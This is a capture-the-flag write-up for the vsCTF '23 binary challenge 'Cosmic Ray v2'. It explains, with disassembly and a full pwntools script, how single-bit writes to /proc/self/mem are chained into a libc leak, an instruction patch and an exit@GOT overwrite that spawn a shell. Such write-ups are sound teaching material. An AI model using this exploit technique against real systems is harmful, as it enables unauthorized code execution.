---
description: An interesting twist on a past CTF challenge.
---

# \[vsCTF '23] Cosmic Ray v2

This challenge is a twist on the [Cosmic Ray](https://ctftime.org/task/26227) challenge from [Sekai CTF '23](https://ctftime.org/event/1923). The original challenge was a simple buffer overflow, but this version removes the overflow opportunity.

## Distribution

We are provided a binary file, `cosmicrayv2`. Running some basic information on the file:

```bash
$ file cosmicrayv2
cosmicrayv2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=456d069a34fcc6d59e5df7c3e860655090962d4d, for GNU/Linux 3.2.0, not stripped

$ checksec cosmicrayv2
[*] '/home/joybuzzer/ctf/vsCTF-2023/pwn/cosmic-ray-v2/dist/cosmicrayv2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

I will use `radare2` and Ghidra for the dissection of this challenge.

Checking `main()`, the most important information is a call to `cosmic_ray()`. Nothing is pushed into `rdi` before the function is called, I will venture into this function assuming no arguments are passed.

We'll use Ghidra for the disassembly of this function. We'll clean it up by naming each local variable, hiding the canary check, and removing some unnecessary casting. The result is shown below.

```c
void cosmic_ray(void)
{
  int pos;
  long address;
  long bits;
  char byte;
  
  puts("Enter an address to send a cosmic ray through:");
  scanf("0x%lx", &address);
  getchar();

  int fd = open("/proc/self/mem", 2);
  lseek(fd, address, 0);
  read(fd, &byte, 1);
  
  bits = (long)byte_to_binary(byte);
  
  puts("\n|0|1|2|3|4|5|6|7|");
  puts("-----------------\n|");
  for (int i = 0; i < 8; ++i) {
    printf("%d|", (addrBin + i));
  }

  puts("\n\nEnter the bit position to flip:");
  scanf("%d",&pos);
  getchar();
  
  if (!(pos >= 0 && pos <= 7)) exit(1);

  int new_bits = flip_bit(bits, pos);
  char new_byte = (char)binary_to_byte(new_bits);
  
  printf("\nBit succesfully flipped! New value is %d\n\n",new_byte);

  lseek(fd, address, 0);
  write(fd, &new_byte, 1);
}
```

What does this function do for us? This function lets us input a memory address and then flip any bit at that specified address. With this, we hold a lot of power! We can change one bit at one address anywhere in the program's memory.

{% hint style="info" %}
Simply based on the solution of the original Cosmic Ray challenge, we know we must modify an instruction. The original solution modified the canary check instruction to jump if there _wasn't_ a buffer overflow. This won't work because we don't get another input once we're done. We need to find another instruction to modify.
{% endhint %}

### Inspiration

I started modifying random instructions after the flip to affect the program's flow. I recognized that `cosmic_ray()` comes right before `main()`, which was a big clue. If I could modify the `ret` instruction so that it no longer returned, the program would continue executing through `main()`, giving me another run of the binary.

What do I change `ret` to? As it is, `ret` is `c3` in hex, which is `11000011` in binary. I must change the instruction such that it's still valid. Otherwise, the program will crash. Using a [x64 Instruction Table](https://ref.x86asm.net/coder64.html), I found that modifying the **second bit** changed the instruction to `83`, a `cmp` instruction. This won't crash the program and will still return to `main()`.

Now that we can run the program infinitely, we can continue to modify single bits until we do something. We can clearly see we must get a shell.

### Attack Vector

We know we must call `ssytem()`. We don't know if ASLR is turned on, but we'll assume it is. This makes Step 1 **to leak `libc`**. From here, we can use the following code as the basis for our next steps:

```as
│           0x00401543      8b45cc         mov eax, dword [var_34h]
│           0x00401546      85c0           test eax, eax
│       ┌─< 0x00401548      7808           js 0x401552
│       │   0x0040154a      8b45cc         mov eax, dword [var_34h]
│       │   0x0040154d      83f807         cmp eax, 7                  ; 7
│      ┌──< 0x00401550      7e0a           jle 0x40155c
│      │└─> 0x00401552      bf01000000     mov edi, 1
│      │    0x00401557      e844fcffff     call sym.imp.exit           ; void exit(int status)
│      └──> 0x0040155c      8b55cc         mov edx, dword [var_34h]
```

We dissected in our disassembly this was the following:

```c
if (!(pos >= 0 && pos <= 7)) exit(1);
// continue
```

This tells us two things:

* If we continue to enter valid bits, we will never call `exit()`.
* If we do put an invalid bit, we can call `exit()` on command.

This leads us to the **GOT Overwrite** exploit: we can overwrite the GOT entry for `exit()` with the address of `system()`. This will allow us to call `system()` with any argument we want.

{% hint style="info" %}
More information on the GOT Overwrite exploit can be found here: https://cyber.cole-ellis.com/binex/08-got/
{% endhint %}

To make this happen, we need to find a way to load `/bin/sh` into `rdi`. There already is an instruction to load `0x1` into `edi` before the call to `exit()`, so we must modify this instruction through consecutive bit-flipping.

{% hint style="warning" %}
### How I found the Solution...

A bit of dumb luck managed to carry me through this. While I was stepping through the possibilities of changing the instruction through `gdb`, I noticed my input was sitting in `rdx` at the time of the `mov edi, 1` instruction. This inspired me to change this instruction to `mov edi, edx`.
{% endhint %}

### Solution

We can now put together our solution. Our solution comes in a few stages:

1. Flip the return bit to allow infinite runs of the binary
2. Leak `libc` using the program's output
3. Modify the `mov edi, 0x1` instruction
4. Modify the GOT entry for `exit()` to point to `system()`
5. Call `system()` after passing `/bin/sh` as our input.

I chose to write some helper functions to do this. The first function, `bit_modify`, takes an address and a bit and modifies that bit number.

```python
def bit_modify(addr, bit):
    # send the address
    p.recvuntil(b'through:\n')
    p.sendline(hex(addr).encode())
    
    # modify the bit
    p.recvuntil(b'flip:\n')
    p.sendline(str(bit).encode())
```

The second function takes an address and reads the byte at that address. It does not modify the data there.

```python
def read(addr):
    # send the address
    p.recvuntil(b'through:\n')
    p.sendline(hex(addr).encode())
    
    # get the byte
    p.recvuntil(b'-----------------\n')
    x = bytes([int(b''.join(p.recvline().strip().split(b'|')).decode(),2)])
    
    # do and undo an action
    p.recvuntil(b'flip:\n')
    p.sendline(b'1')
    bit_modify(addr, 1)
    
    # return the leaked bit
    return x
```

{% hint style="info" %}
You'll notice this function _actually does_ modify the data there but switches it back!
{% endhint %}

The third function is `string_modify`, which takes an initial address and does a series of modifications. This is used to change instructions or series of addresses.

```python
def string_modify(base, old, new):
    to_change = bytes(a ^ b for a, b in zip(old, new))
    to_change_bytes = [format(byte, '08b') for byte in to_change]

    for byte in range(len(to_change_bytes)):
        for bit in range(len(to_change_bytes[byte])):
            if to_change_bytes[byte][bit] == '1':
                bit_modify(base + byte, bit)
```

We can write the rest of our exploit now that we have these helper functions. Getting the addresses of most of the data here is trivial, so I'll leave it as an exercise to the reader.

1.  Flip the return bit to allow infinite runs of the binary

    ```python
    print('Permitting infinite read/write...')
    bit_modify(0x4015e9, 2)
    ```
2.  Leak `libc` using the program's output. I leaked `exit@got` and then used the provided `libc` file to get the offset in `libc`.

    ```python
    print('Leaking libc...')
    exit_got = bytearray()
    for i in range(8):
        exit_got += read(0x403fe8 + i)
    exit_got = u64(exit_got)
    print('\texit address:', hex(exit_got))

    libc.address = exit_got - libc.sym.exit
    print('\tlibc leaked:', hex(libc.address))
    system_got = libc.sym.system
    print('\tsystem address:', hex(system_got))
    ```
3.  Modify the `mov edi, 0x1` instruction. This is the most difficult part of the exploit. We must find the address of the instruction and then modify it to `mov edi, edx`.

    ```python
    print('Modifying MOV EDI, 0x1 instruction')
    string_modify(0x401552, b"\xbf\x01\x00\x00\x00", b"\x48\x89\xd7\x90\x90")
    ```
4.  Modify the GOT entry for `exit()` to point to `system()`. We can use the same `string_modify` function to do this.

    ```python
    print('Modifying exit@GOT address')
    string_modify(0x403fe8, exit_got.to_bytes(8, 'little'), system_got.to_bytes(8, 'little'))
    ```
5.  Call `system()` after passing `/bin/sh` as our input. By passing data that's not a valid bit, it will call `exit()` (which is now `system()`). The address we chose to write was arbitrary, but it must be a valid address.

    ```python
    print('Getting shell...')
    p.recvuntil(b'through:\n')
    p.sendline(b'0x47')
    p.recvuntil(b'flip:\n')
    p.sendline(b'//bin/sh\x00')

    p.interactive()
    ```

If we run this, we get a shell and the flag!

## Full Exploit

{% code title="exploit.py" lineNumbers="true" %}
```python
from pwn import *

elf = context.binary = ELF('./dist/cosmicrayv2')
libc = elf.libc
p = remote('vsc.tf', 3047)

def bit_modify(addr, bit):
    # send the address
    p.recvuntil(b'through:\n')
    p.sendline(hex(addr).encode())
    
    # modify the bit
    p.recvuntil(b'flip:\n')
    p.sendline(str(bit).encode())

def read(addr):
    # send the address
    p.recvuntil(b'through:\n')
    p.sendline(hex(addr).encode())
    
    # get the byte
    p.recvuntil(b'-----------------\n')
    x = bytes([int(b''.join(p.recvline().strip().split(b'|')).decode(),2)])
    
    # do and undo an action
    p.recvuntil(b'flip:\n')
    p.sendline(b'1')
    bit_modify(addr, 1)
    
    # return the leaked bit
    return x

def string_modify(base, old, new):
    to_change = bytes(a ^ b for a, b in zip(old, new))
    to_change_bytes = [format(byte, '08b') for byte in to_change]

    for byte in range(len(to_change_bytes)):
        for bit in range(len(to_change_bytes[byte])):
            if to_change_bytes[byte][bit] == '1':
                bit_modify(base + byte, bit)

print('Permitting infinite read/write...')
bit_modify(0x4015e9, 2)

print('Leaking libc...')
exit_got = bytearray()
for i in range(8):
    exit_got += read(0x403fe8 + i)
exit_got = u64(exit_got)
print('\texit address:', hex(exit_got))

libc.address = exit_got - libc.sym.exit
print('\tlibc leaked:', hex(libc.address))
system_got = libc.sym.system
print('\tsystem address:', hex(system_got))

print('Modifying MOV EDI, 0x1 instruction')
string_modify(0x401552, b"\xbf\x01\x00\x00\x00", b"\x48\x89\xd7\x90\x90")
print('Modifying exit@GOT address')
string_modify(0x403fe8, exit_got.to_bytes(8, 'little'), system_got.to_bytes(8, 'little'))

print('Getting shell...')
p.recvuntil(b'through:\n')
p.sendline(b'0x47')
p.recvuntil(b'flip:\n')
p.sendline(b'//bin/sh\x00')

p.interactive()
```
{% endcode %}
